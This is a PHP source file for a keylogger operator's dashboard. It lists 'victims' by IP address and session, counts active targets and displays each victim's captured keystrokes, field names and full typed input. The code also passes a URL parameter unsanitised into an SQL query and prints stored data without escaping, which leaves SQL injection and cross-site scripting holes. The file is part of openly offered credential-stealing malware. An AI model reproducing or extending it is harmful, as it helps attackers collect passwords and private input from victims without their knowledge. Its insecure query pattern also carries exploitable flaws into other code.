<?php
// view_logs.php - Fixed version
include 'database.php';

// Get all victims
$victims = $conn->query("SELECT * FROM victims ORDER BY last_active DESC");

// Get stats
$total_keys = $conn->query("SELECT COUNT(*) as c FROM keystrokes")->fetch_assoc()['c'];
$active_now = $conn->query("SELECT COUNT(*) as c FROM victims WHERE last_active > NOW() - INTERVAL 5 MINUTE")->fetch_assoc()['c'];

// Get selected victim
$selected = $_GET['session'] ?? '';
if ($selected) {
    $keys = $conn->query("SELECT * FROM keystrokes WHERE session_id = '$selected' ORDER BY timestamp DESC");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <style>
        body { font-family: Arial; background: #1a1a1a; color: white; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #2d2d2d; padding: 20px; border-left: 4px solid #00ff00; }
        .stat-card .value { font-size: 28px; color: #00ff00; }
        .dashboard { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
        .sidebar { background: #2d2d2d; padding: 20px; height: 70vh; overflow-y: auto; }
        .victim-card { background: #3d3d3d; padding: 15px; margin-bottom: 10px; cursor: pointer; }
        .victim-card:hover { background: #4d4d4d; }
        .victim-card.active { border-left: 4px solid #00ff00; }
        .live-badge { display: inline-block; width: 10px; height: 10px; background: #00ff00; border-radius: 50%; margin-right: 5px; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } }
        .main-content { background: #2d2d2d; padding: 20px; height: 70vh; overflow-y: auto; }
        .log-entry { background: #1a1a1a; padding: 15px; margin-bottom: 10px; border-left: 4px solid #00ff00; }
        .time { color: #888; font-size: 12px; }
        .app { color: #00ff00; font-weight: bold; }
        .btn { display: inline-block; padding: 10px 20px; margin: 10px; text-decoration: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Keylogger Dashboard</h1>
        
        <a href="create_victim.php" class="btn" style="background:#4CAF50; color:white;">➕ Create Test Victim</a>
        <a href="index.php" class="btn" style="background:#2196F3; color:white;">🎯 Test Page</a>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Victims</h3>
                <div class="value"><?php echo $victims->num_rows; ?></div>
            </div>
            <div class="stat-card">
                <h3>Keys</h3>
                <div class="value"><?php echo $total_keys; ?></div>
            </div>
            <div class="stat-card">
                <h3>Active Now</h3>
                <div class="value"><?php echo $active_now; ?></div>
            </div>
        </div>
        
        <div class="dashboard">
            <div class="sidebar">
                <h3>Victims List</h3>
                <?php if($victims->num_rows > 0): ?>
                    <?php while($v = $victims->fetch_assoc()): 
                        $is_active = $v['last_active'] && (time() - strtotime($v['last_active'])) < 300;
                    ?>
                    <div class="victim-card <?php echo $selected == $v['session_id'] ? 'active' : ''; ?>" 
                         onclick="location.href='?session=<?php echo $v['session_id']; ?>'">
                        <?php if($is_active): ?><span class="live-badge"></span><?php endif; ?>
                        <strong><?php echo $v['ip_address']; ?></strong>
                        <div style="font-size:12px; color:#888;">
                            <?php echo substr($v['session_id'], 0, 8); ?>...
                            <?php echo $v['last_active'] ? date('H:i', strtotime($v['last_active'])) : ''; ?>
                        </div>
                    </div>
                    <?php endwhile; ?>
                <?php else: ?>
                    <p style="color:#888;">No victims yet.<br>Click "Create Test Victim" button.</p>
                <?php endif; ?>
            </div>
            
            <div class="main-content">
                <?php if($selected && isset($keys) && $keys->num_rows > 0): ?>
                    <h3>Keystrokes</h3>
                    <?php while($k = $keys->fetch_assoc()): ?>
                    <div class="log-entry">
                        <div class="time"><?php echo $k['timestamp']; ?></div>
                        <div class="app"><?php echo $k['app_name']; ?></div>
                        <div>Field: <?php echo $k['field_name']; ?></div>
                        <div>Key: <strong><?php echo $k['key_pressed']; ?></strong></div>
                        <?php if($k['full_input']): ?>
                        <div style="background:#333; padding:10px; margin-top:10px;">
                            Value: <?php echo $k['full_input']; ?>
                        </div>
                        <?php endif; ?>
                    </div>
                    <?php endwhile; ?>
                <?php elseif($selected): ?>
                    <p>No keystrokes for this victim.</p>
                <?php else: ?>
                    <p style="text-align:center; padding:50px;">Select a victim to view keystrokes</p>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>